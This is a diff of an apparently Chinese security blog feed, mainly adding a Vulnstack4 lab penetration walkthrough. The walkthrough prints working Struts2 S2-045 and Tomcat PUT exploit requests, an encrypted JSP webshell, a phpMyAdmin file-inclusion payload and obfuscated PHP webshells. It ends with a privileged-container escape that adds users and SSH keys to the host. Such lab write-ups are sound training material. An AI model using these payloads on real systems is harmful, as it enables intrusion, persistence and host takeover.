@@ -9,9 +9,9 @@
 <p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/b387c7e7abb08c5c048d3a6e807cb9f6.png" alt="img"></p>
 <p>2、别名(CNAME)记录<br>也被称为规范名字。这种记录允许您将多个名字映射到同一台计算机。 通常用于同时提供WWW和MAIL服务的计算机。例如，有一台计算机名为“host.mydomain.com”（A记录）。 它同时提供WWW和MAIL服务，为了便于用户访问服务。可以为该计算机设置两个别名（CNAME）：WWW和MAIL。 这两个别名的全称就是“<a href="http://www.mydomain.com”和“mail.mydomain.com”.实际上他们都指向“host.mydomain.com”./">www.mydomain.com”和“mail.mydomain.com”。实际上他们都指向“host.mydomain.com”。</a></p>
 <p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/1efd3987e07018e881857b4561bc87ee.png" alt="img"></p>
-<p>3、MX（Mail Exchanger）记录<br>是邮件交换记录，它指向一个邮件服务器，用于电子邮件系统发邮件时根据 收信人的地址后缀来定位邮件服务器。例如，当Internet上的某用户要发一封信给 <a href="mailto:&#117;&#x73;&#101;&#x72;&#64;&#122;&#104;&#111;&#110;&#x67;&#x6a;&#105;&#x65;&#46;&#x63;&#x6f;&#x6d;">&#117;&#x73;&#101;&#x72;&#64;&#122;&#104;&#111;&#110;&#x67;&#x6a;&#105;&#x65;&#46;&#x63;&#x6f;&#x6d;</a> 时，该用户的邮件系统通过DNS查找zhongjie.com这个域名的MX记录，如果MX记录存在， 用户计算机就将邮件发送到MX记录所指定的邮件服务器上。</p>
+<p>3、MX（Mail Exchanger）记录<br>是邮件交换记录，它指向一个邮件服务器，用于电子邮件系统发邮件时根据 收信人的地址后缀来定位邮件服务器。例如，当Internet上的某用户要发一封信给 <a href="mailto:&#117;&#x73;&#101;&#x72;&#x40;&#122;&#104;&#x6f;&#x6e;&#103;&#x6a;&#x69;&#101;&#x2e;&#x63;&#111;&#109;">&#117;&#x73;&#101;&#x72;&#x40;&#122;&#104;&#x6f;&#x6e;&#103;&#x6a;&#x69;&#101;&#x2e;&#x63;&#111;&#109;</a> 时，该用户的邮件系统通过DNS查找zhongjie.com这个域名的MX记录，如果MX记录存在， 用户计算机就将邮件发送到MX记录所指定的邮件服务器上。</p>
 <p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/6cc3e66a493470c669a38c15a8a9343d.png" alt="img"></p>
-<p>4、TXT记录<br>TXT记录一般指为某个主机名或域名设置的说明，如：<br>1）admin IN TXT “jack, mobile:13800138000”；<br>2）mail IN TXT “邮件主机, 存放在xxx ,管理人：AAA”，Jim IN TXT “contact: <a href="mailto:&#x61;&#98;&#99;&#64;&#x6d;&#x61;&#x69;&#x6c;&#x73;&#x65;&#114;&#118;&#101;&#114;&#x2e;&#99;&#x6f;&#x6d;">&#x61;&#98;&#99;&#64;&#x6d;&#x61;&#x69;&#x6c;&#x73;&#x65;&#114;&#118;&#101;&#114;&#x2e;&#99;&#x6f;&#x6d;</a>“也就是您可以设置 TXT ，以便使别人联系到您。</p>
+<p>4、TXT记录<br>TXT记录一般指为某个主机名或域名设置的说明，如：<br>1）admin IN TXT “jack, mobile:13800138000”；<br>2）mail IN TXT “邮件主机, 存放在xxx ,管理人：AAA”，Jim IN TXT “contact: <a href="mailto:&#x61;&#98;&#x63;&#64;&#x6d;&#x61;&#x69;&#x6c;&#115;&#x65;&#x72;&#118;&#x65;&#x72;&#46;&#99;&#111;&#109;">&#x61;&#98;&#x63;&#64;&#x6d;&#x61;&#x69;&#x6c;&#115;&#x65;&#x72;&#118;&#x65;&#x72;&#46;&#99;&#111;&#109;</a>“也就是您可以设置 TXT ，以便使别人联系到您。</p>
 <p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/9b56f3771ee8c12a6c4b9e1ab7c8e08a.png" alt="img"></p>
 <p>5、NS记录<br>ns记录全称为Name Server 是一种域名服务器记录，用来明确当前你的域名是由哪个DNS服务器来进行解析的。这里的NS记录只对子域名生效。例如用户希望由12.34.56.78这台服务器解析news.mydomain.com，则需要设置news.mydomain.com的NS记录。</p>
 <h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><h3 id="域控制器"><a href="#域控制器" class="headerlink" title="域控制器"></a>域控制器</h3><p>Windows Server 2008 R2: 192.168.184.132（NAT）</p>
@@ -311,6 +311,235 @@
       </tags>
   </entry>
   <entry>
+    <title>Vulnstack4靶场内网渗透</title>
+    <url>/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
+    <content><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><blockquote>
+<p><strong>机器密码</strong></p>
+<ul>
+<li><strong>web(Ubuntu)：</strong>ubuntu:ubuntu</li>
+<li><strong>域成员账号：</strong>douser:Dotest123</li>
+<li><strong>域管账号：</strong>administrator:Test2022</li>
+</ul>
+<p>这里域管密码我改了，因为原来的密码过期了，后面mimikatz抓不到密码</p>
+</blockquote>
+<p>需要添加一张192.168.183.0/24网段的内网网卡</p>
+<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220716114734710.png" alt="image-20220716114734710"></p>
+<p>若是kali用的Nat模式这里不要勾选“将主机虚拟适配器连接到此网络”，若是桥接模式则勾选</p>
+<p>ubuntu这台web服务器利用docker开启web服务</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># 启动docke容器</span><br><span class="line"><span class="built_in">cd</span> /home/ubuntu/Desktop/vulhub/struts2/s2-<span class="number">045</span></span><br><span class="line">sudo docker-compose up -d</span><br><span class="line"><span class="built_in">cd</span> /home/ubuntu/Desktop/vulhub/tomcat/CVE-<span class="number">2017</span>-<span class="number">12615</span>/</span><br><span class="line">sudo docker-compose up -d</span><br><span class="line"><span class="built_in">cd</span> /home/ubuntu/Desktop/vulhub/phpmyadmin/CVE-<span class="number">2018</span>-<span class="number">12613</span>/</span><br><span class="line">sudo docker-compose up -d</span><br><span class="line"></span><br><span class="line"># 查看运行的docker容器</span><br><span class="line">sudo docker ps -a</span><br></pre></td></tr></table></figure>
+
+
+
+<p>win7总是自动挂起</p>
+<p>进入控制面板 → 硬件和声音 → 更改计算机休眠时间 （改为从不休眠）</p>
+<h2 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h2><p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220719110838382.png" alt="image-20220719110838382"></p>
+<h2 id="打靶"><a href="#打靶" class="headerlink" title="打靶"></a>打靶</h2><p>老样子先用nmap对192.168.184.0/24网段进行端口扫描<code>nmap -sV 192.168.184.0/24</code></p>
+<p>在192.168.184.139这台主机发现三个web服务</p>
+<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220716164723466.png" alt="image-20220716164723466"></p>
+<p>接下来来对这三个服务一次访问并通过这三个web服务不同路径获取该外网主机权限</p>
+<h3 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h3><h4 id="S2-045"><a href="#S2-045" class="headerlink" title="S2-045"></a>S2-045</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># EXP抓上传的包，修改Content-<span class="built_in">Type</span>的值</span><br><span class="line">POST / HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="function">Host: 192.168.184.139:2001</span></span><br><span class="line"><span class="function"><span class="title">User</span>-<span class="title">Agent</span>: <span class="title">Mozilla</span>/5.0 (<span class="title">Windows</span> <span class="title">NT</span> 10.0; <span class="title">Win64</span>; <span class="title">x64</span>; <span class="title">rv</span>:100.0) <span class="title">Gecko</span>/20100101 <span class="title">Firefox</span>/100.0</span></span><br><span class="line"><span class="function"><span class="title">Accept</span>: <span class="title">text</span>/<span class="title">html</span>,<span class="title">application</span>/<span class="title">xhtml</span>+<span class="title">xml</span>,<span class="title">application</span>/<span class="title">xml</span>;<span class="title">q</span>=0.9,<span class="title">image</span>/<span class="title">avif</span>,<span class="title">image</span>/<span class="title">webp</span>,*/*;<span class="title">q</span>=0.8</span></span><br><span class="line"><span class="function"><span class="title">Accept</span>-<span class="title">Language</span>: <span class="title">zh</span>-<span class="title">CN</span>,<span class="title">zh</span>;<span class="title">q</span>=0.8,<span class="title">zh</span>-<span class="title">TW</span>;<span class="title">q</span>=0.7,<span class="title">zh</span>-<span class="title">HK</span>;<span class="title">q</span>=0.5,<span class="title">en</span>-<span class="title">US</span>;<span class="title">q</span>=0.3,<span class="title">en</span>;<span class="title">q</span>=0.2</span></span><br><span class="line"><span class="function"><span class="title">Accept</span>-<span class="title">Encoding</span>: <span class="title">gzip</span>, <span class="title">deflate</span></span></span><br><span class="line"><span class="function"><span class="title">Content</span>-<span class="title">Type</span>: &quot;%&#123;(#<span class="title">nike</span>=&#x27;<span class="title">multipart</span>/<span class="title">form</span>-<span class="title">data</span>&#x27;).(#<span class="title">dm</span>=@<span class="title">ognl.OgnlContext</span>@<span class="title">DEFAULT_MEMBER_ACCESS</span>).(#<span class="title">_memberAccess</span>?(#<span class="title">_memberAccess</span>=#<span class="title">dm</span>):((#<span class="title">container</span>=#<span class="title">context</span>[&#x27;<span class="title">com.opensymphony.xwork2.ActionContext.container</span>&#x27;]).(#<span class="title">ognlUtil</span>=#<span class="title">container.getInstance</span>(@<span class="title">com.opensymphony.xwork2.ognl.OgnlUtil</span>@<span class="title">class</span>)).(#<span class="title">ognlUtil.getExcludedPackageNames</span>().<span class="title">clear</span>()).(#<span class="title">ognlUtil.getExcludedClasses</span>().<span class="title">clear</span>()).(#<span class="title">context.setMemberAccess</span>(#<span class="title">dm</span>)))).(#<span class="title">cmd</span>=&#x27;<span class="title">whoami</span>&#x27;).(#<span class="title">iswin</span>=(@<span class="title">java.lang.System</span>@<span class="title">getProperty</span>(&#x27;<span class="title">os.name</span>&#x27;).<span class="title">toLowerCase</span>().<span class="title">contains</span>(&#x27;<span class="title">win</span>&#x27;))).(#<span class="title">cmds</span>=(#<span class="title">iswin</span>?&#123;&#x27;<span class="title">cmd.exe</span>&#x27;,&#x27;/<span class="title">c</span>&#x27;,#<span class="title">cmd</span>&#125;:&#123;&#x27;/<span class="title">bin</span>/<span class="title">bash</span>&#x27;,&#x27;-<span class="title">c</span>&#x27;,#<span class="title">cmd</span>&#125;)).(#<span class="title">p</span>=<span class="title">new</span> <span class="title">java.lang.ProcessBuilder</span>(#<span class="title">cmds</span>)).(#<span class="title">p.redirectErrorStream</span>(<span class="title">true</span>)).(#<span class="title">process</span>=#<span class="title">p.start</span>()).(#<span class="title">ros</span>=(@<span class="title">org.apache.struts2.ServletActionContext</span>@<span class="title">getResponse</span>().<span class="title">getOutputStream</span>())).(@<span class="title">org.apache.commons.io.IOUtils</span>@<span class="title">copy</span>(#<span class="title">process.getInputStream</span>(),#<span class="title">ros</span>)).(#<span class="title">ros.flush</span>())&#125;&quot;</span></span><br><span class="line"><span class="function"><span class="title">Content</span>-<span class="title">Length</span>: 0</span></span><br><span class="line"><span class="function"><span class="title">Origin</span>: <span class="title">http</span>://192.168.184.139:2001</span></span><br><span class="line"><span class="function"><span class="title">Connection</span>: <span class="title">close</span></span></span><br><span class="line"><span class="function"><span class="title">Referer</span>: <span class="title">http</span>://192.168.184.139:2001/<span class="title">doUpload.action</span></span></span><br><span class="line"><span class="function"><span class="title">Cookie</span>: <span class="title">JSESSIONID</span>=1<span class="title">d6q15kddtb1z136edkhjwibnl</span>; <span class="title">phpMyAdmin</span>=4<span class="title">faf82614b1631c025eb550defea0d14</span>; <span class="title">pma_lang</span>=<span class="title">zh_CN</span></span></span><br><span class="line"><span class="function"><span class="title">Upgrade</span>-<span class="title">Insecure</span>-<span class="title">Requests</span>: 1</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220716172351451.png" alt="image-20220716172351451"></p>
+<h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>留坑</p>
+<h4 id="tomcat-PUT上传-CVE-2017-12615"><a href="#tomcat-PUT上传-CVE-2017-12615" class="headerlink" title="tomcat PUT上传(CVE-2017-12615)"></a>tomcat PUT上传(CVE-2017-12615)</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># EXP</span><br><span class="line">PUT /tomcat.jsp/ HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="function">Host: <span class="title">your</span>-<span class="title">ip</span>:8080</span></span><br><span class="line"><span class="function"><span class="title">Accept</span>: */*</span></span><br><span class="line"><span class="function"><span class="title">Accept</span>-<span class="title">Language</span>: <span class="title">en</span></span></span><br><span class="line"><span class="function"><span class="title">User</span>-<span class="title">Agent</span>: <span class="title">Mozilla</span>/5.0 (<span class="title">compatible</span>; <span class="title">MSIE</span> 9.0; <span class="title">Windows</span> <span class="title">NT</span> 6.1; <span class="title">Win64</span>; <span class="title">x64</span>; <span class="title">Trident</span>/5.0)</span></span><br><span class="line"><span class="function"><span class="title">Connection</span>: <span class="title">close</span></span></span><br><span class="line"><span class="function"><span class="title">Content</span>-<span class="title">Type</span>: <span class="title">application</span>/<span class="title">x</span>-<span class="title">www</span>-<span class="title">form</span>-<span class="title">urlencoded</span></span></span><br><span class="line"><span class="function"><span class="title">Content</span>-<span class="title">Length</span>: 572</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">&lt;%@<span class="title">page</span> <span class="title">import</span>=&quot;<span class="title">java.util</span>.*,<span class="title">javax.crypto</span>.*,<span class="title">javax.crypto.spec</span>.*&quot;%&gt;&lt;%!<span class="title">class</span> <span class="title">U</span> <span class="title">extends</span> <span class="title">ClassLoader</span>&#123;<span class="title">U</span>(<span class="title">ClassLoader</span> <span class="title">c</span>)&#123;<span class="title">super</span>(<span class="title">c</span>);&#125;<span class="title">public</span> <span class="title">Class</span> <span class="title">g</span>(<span class="title">byte</span> []<span class="title">b</span>)&#123;<span class="title">return</span> <span class="title">super.defineClass</span>(<span class="title">b</span>,0,<span class="title">b.length</span>);&#125;&#125;%&gt;&lt;%<span class="title">if</span> (<span class="title">request.getMethod</span>().<span class="title">equals</span>(&quot;<span class="title">POST</span>&quot;))&#123;<span class="title">String</span> <span class="title">k</span>=&quot;<span class="title">e45e329feb5d925b</span>&quot;;/*åÆ¥:Þ¥Æ32<span class="title">Mmd5</span>&lt;<span class="title">M16M</span>Ø¤Þ¥Æ<span class="title">rebeyond</span>*/<span class="title">session.putValue</span>(&quot;<span class="title">u</span>&quot;,<span class="title">k</span>);<span class="title">Cipher</span> <span class="title">c</span>=<span class="title">Cipher.getInstance</span>(&quot;<span class="title">AES</span>&quot;);<span class="title">c.init</span>(2,<span class="title">new</span> <span class="title">SecretKeySpec</span>(<span class="title">k.getBytes</span>(),&quot;<span class="title">AES</span>&quot;));<span class="title">new</span> <span class="title">U</span>(<span class="title">this.getClass</span>().<span class="title">getClassLoader</span>()).<span class="title">g</span>(<span class="title">c.doFinal</span>(<span class="title">new</span> <span class="title">sun.misc.BASE64Decoder</span>().<span class="title">decodeBuffer</span>(<span class="title">request.getReader</span>().<span class="title">readLine</span>()))).<span class="title">newInstance</span>().<span class="title">equals</span>(<span class="title">pageContext</span>);&#125;%&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220716173303485.png" alt="image-20220716173303485"></p>
+<h5 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h5><p>留坑</p>
+<h4 id="phpmyadmin文件包含-CVE-2018-12613"><a href="#phpmyadmin文件包含-CVE-2018-12613" class="headerlink" title="phpmyadmin文件包含(CVE-2018-12613)"></a>phpmyadmin文件包含(CVE-2018-12613)</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># POC</span><br><span class="line"><span class="function">http://192.168.184.139:2003//<span class="title">index.php</span>?<span class="title">target</span>=<span class="title">db_sql.php</span>%253<span class="title">f</span>/../../../../../../../../<span class="title">etc</span>/<span class="title">passwd</span></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220716205700320.png" alt="image-20220716205700320"></p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># EXP</span><br><span class="line"># 在http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">184</span>.<span class="number">139</span>:<span class="number">2003</span>/server_sql.php页面写入SELECT &quot;&lt;?=system(&#x27;whoami&#x27;);?&gt;&quot;</span><br><span class="line"># 会保存到/tmp/sess_[Cookie中phpMyadmin的值]</span><br><span class="line"># Payload如下</span><br><span class="line"><span class="function">http://192.168.184.139:2003/<span class="title">index.php</span>?<span class="title">target</span>=<span class="title">db_sql.php</span>%253<span class="title">f</span>/../../../../../../../<span class="title">tmp</span>/<span class="title">sess_2b513185c9f040cae084bc2d6b5f79a9</span></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220716210209265.png" alt="image-20220716210209265"></p>
+<p>上面勉强用system()函数命令执行成功，但我还是想让蚁剑能连上，于是有了接下来的一番折腾</p>
+<p>由于我最开始尝试直接传<code>&lt;?php eval($_POST[cmd]);?&gt;</code>，但并没有成功连上蚁剑，怀疑可能是被杀了吧</p>
+<p>接着尝试<code>&lt;?php assert($_POST[cmd]);?&gt;</code>，这回直接报错</p>
+<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220717122731632.png" alt="image-20220717122731632"></p>
+<p>在查了网上资料后结论是，PHP7.0及之前的版本都可以执行，但是之后的版本就<strong>不允许</strong>在assert()函数中传入<strong>可变字符串</strong>了</p>
+<p>但我看到一篇文章<a href="https://www.freebuf.com/articles/network/244704.html">记一次Vulnstack靶场内网渗透（二） - FreeBuf网络安全行业门户</a>，这个作者就是用的assert成功连上蚁剑的，他用的免杀马如下</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$p</span> = <span class="keyword">array</span>(<span class="string">&#x27;f&#x27;</span>=&gt;<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;pffff&#x27;</span>=&gt;<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;e&#x27;</span>=&gt;<span class="string">&#x27;fffff&#x27;</span>,<span class="string">&#x27;lfaaaa&#x27;</span>=&gt;<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;nnnnn&#x27;</span>=&gt;<span class="string">&#x27;t&#x27;</span>);<span class="variable">$a</span> = array_keys(<span class="variable">$p</span>);<span class="variable">$_</span>=<span class="variable">$p</span>[<span class="string">&#x27;pffff&#x27;</span>].<span class="variable">$p</span>[<span class="string">&#x27;pffff&#x27;</span>].<span class="variable">$a</span>[<span class="number">2</span>];<span class="variable">$_</span>= <span class="string">&#x27;a&#x27;</span>.<span class="variable">$_</span>.<span class="string">&#x27;rt&#x27;</span>;<span class="variable">$_</span>(base64_decode(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;whoami&#x27;</span>]));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我就纳闷他是怎么成功的，表示很不理解，现在只能把锅甩给docker环境有问题了</p>
+<p>并且我还在本地测了一下，用它的马我也没成功，但是改了一下把base64_decode删了，在蚁剑编码器选择base64就能连，我就觉得更加玄学了，并且我用我改的去测靶机还是没有成功，要哭辣</p>
+<p>这是这位作者的免杀给了我思路，之前eval没有成功，我能不能也像他一样做点混淆来绕过被杀</p>
+<p>然而尝试过后并不可行，原因是<strong>eval()并不是函数，它是一个语言构造器，不能被可变函数调用</strong>，所以打咩</p>
+<p>而且我还查到，<strong>assert() is a language construct in PHP 7</strong>，大写的一个G</p>
+<p>在本地测试总结下来就是：<strong>eval()不能用可变函数调用，php7.1之后assert()也不能用可变函数调用，并且assert()7.1之后也不能用作一句话，但实际情况还是测一下万一能用</strong></p>
+<p>但这里还有一个奇怪的点，记录一下</p>
+<p>我在本地测试的时候，用的是PHP7.3.9，虽然直接使用assert()，<strong>会报不能用可变字符串的错但是能连上蚁剑</strong>（蚁剑编码器勾选base64）</p>
+<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220717125228664.png" alt="image-20220717125228664"></p>
+<p>而且在浏览器上测都不用base64就能执行</p>
+<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220717125331910.png" alt="image-20220717125331910"></p>
+<p>可以看到有报错，但是能执行太怪了，我已经晕了</p>
+<h5 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h5><p><a href="https://www.freebuf.com/articles/web/278808.html">https://www.freebuf.com/articles/web/278808.html</a></p>
+<p>这里有个疑问，上面链接的文章中说<strong>php会将前面的db_sql.php?当成目录</strong>，但我在本地测并没有成功，不知原因</p>
+<h3 id="逃逸docker容器–privileged特权模式"><a href="#逃逸docker容器–privileged特权模式" class="headerlink" title="逃逸docker容器–privileged特权模式"></a>逃逸docker容器–privileged特权模式</h3><blockquote>
+<p>使用特权模式启动容器，可以获取大量设备文件访问权限。因为当管理员执行docker run —privileged时，Docker容器将<strong>被允许访问主机上的所有设备</strong>，并可以执行mount命令进行挂载。</p>
+<p>当控制使用特权模式启动的容器时，docker管理员可通过<strong>mount命令将外部宿主机磁盘设备挂载进容器内部</strong>，获取对整个宿主机的文件读写权限，此外还可以通过写入计划任务等方式在宿主机执行命令。</p>
+</blockquote>
+<p>这里查看docker启动的配置文件.yml发现只有tomcat这个容器是特权模式启动起来的</p>
+<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220717165347989.png" alt="image-20220717165347989"></p>
+<p>其实通过看<code>ls /dev</code>也可以看出端倪，明显特权模式的设备更多</p>
+<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220717165258051.png" alt="image-20220717165258051"></p>
+<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220717165143713.png" alt="image-20220717165143713"></p>
+<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220717164420846.png" alt="image-20220717164420846"></p>
+<p>所以接下来的操作都是基于tomcat这个docker容器完成</p>
+<h4 id="姿势1：添加用户–来自白日梦组长"><a href="#姿势1：添加用户–来自白日梦组长" class="headerlink" title="姿势1：添加用户–来自白日梦组长"></a>姿势1：添加用户–来自白日梦组长</h4><blockquote>
+<p>通过修改/etc/passwd和/etc/shadow文件</p>
+<p>/dev/sd[a-z]：SCSI设备</p>
+</blockquote>
+<p>在根目录下创建一个目录名为hacker的文件夹，并将/dev/sda1挂载到该目录下，这是/hacker相当于就是物理主机的根目录了</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir /hacker</span><br><span class="line">mount /dev/sda1 /hacker</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220717172258614.png" alt="image-20220717172258614"></p>
+<p>（插一句，这里提权不能直接添加root用户，因为root用户没有远程登录权限，我们现在只是有对文件操作的权限，并不能重启ssh服务来修改配置，所以下面添加的是一个普通用户）</p>
+<blockquote>
+<p>PermitRootLogin 配置项都有哪些配置参数？</p>
+<ul>
+<li>yes</li>
+<li>no</li>
+<li>without-password：root可以登录，但是不允许通过密码ssh登陆</li>
+<li>forced-commands-only：可以登录，但是登陆后不能进入交互，而是执行指定的命令后自动退出</li>
+</ul>
+</blockquote>
+<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220717223312448.png" alt="image-20220717223312448"></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 先在kali里创一个普通用户</span></span><br><span class="line">useradd -m hack</span><br><span class="line">passwd hack</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用上面创建的用户信息修改目标/etc/passwd和/etc/shadow</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;hack:x:1002:1002::/home/hack:/bin/sh&#x27;</span> &gt;&gt; /hacker/etc/passwd</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;hack:$6$sZJ3nupD0kfMhAN5$rQ36pINAUIDIE7HCvbWOBLhdtDL5M7D5dw2Af5saRzTbI0PHFBlc2DyDjQPH1880gpDr4VrHh526hxigF5Ksk.:19190:0:99999:7:::&#x27;</span> &gt;&gt; /hacker/etc/shadow</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在kali中ssh登录该用户</span></span><br><span class="line">ssh hack@192.168.184.139</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220717180458569.png" alt="image-20220717180458569"></p>
+<p>这里还只是普通用户权限</p>
+<p>直接使用<code>sudo su root</code>进行提权会提示用户不在sudoers file中</p>
+<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220717181515687.png" alt="image-20220717181515687"></p>
+<p>我们可以回到tomcat的shell里去手动添加</p>
+<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220717181841154.png" alt="image-20220717181841154"></p>
+<p>再次执行<code>sudo su root</code>，提权成功</p>
+<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220717181946938.png" alt="image-20220717181946938"></p>
+<p>这里觉得白日梦组长的姿势太帅了，学到了很多</p>
+<h4 id="姿势2：ssh密钥利用"><a href="#姿势2：ssh密钥利用" class="headerlink" title="姿势2：ssh密钥利用"></a>姿势2：ssh密钥利用</h4><blockquote>
+<p>前提：目标已经开启ssh密钥登陆功能，因为虽然我们能修改/etc/ssh/sshd_config</p>
+<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">RSAAuthentication</span> <span class="literal">yes</span></span><br><span class="line">PubkeyAuthentication <span class="literal">yes</span></span><br></pre></td></tr></table></figure>
+
+<p>但是没有权限重启ssh服务</p>
+</blockquote>
+<p>挂载就不赘述了，同姿势1</p>
+<p>这里查看配置文件/etc/ssh/sshd_config，开启密钥登陆，故可行</p>
+<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220717223100634.png" alt="image-20220717223100634"></p>
+<ol>
+<li><p>制作密钥对</p>
+<p>首先在kali上制作密钥对。首先用密码登录到你打算使用密钥登录的账户，然后执行以下命令：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh-keygen</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/16/Vulnstack4%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220717224512053.png" alt="image-20220717224512053"></p>
+</li>
+<li><p>在目标上安装公钥</p>
+<p>首先利用冰蝎将生成的公钥<code>id_rsa.pub</code>上传到目标<code>/hacker/home/ubuntu/.ssh/</code>目录，然后执行如下命令</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat id_rsa.pub &gt;&gt; authorized_keys</span><br></pre></td></tr></table></figure>
+
+<p>这里还需要对一些权限进行修改</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chmod 600 authorized_keys</span><br><span class="line">chmod 700 /hacker/home/ubuntu/.ssh</span><br></pre></td></tr></table></figure></li>
+<li><p>ssh密钥登录</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -i /root/.ssh/id_rsa ubuntu@192.168.184.139</span><br></pre></td></tr></table></figure>
+
+<p>但是不知道为什么我试了好多次都没有成功，我甚至重新把这个ubuntu装了一遍还是不行，离谱</p>
+</li>
+</ol>
+<h3 id="攻入内网"><a href="#攻入内网" class="headerlink" title="攻入内网"></a>攻入内网</h3><p>前面已经拿下了Ubuntu这台服务器，查看网卡信息</p>
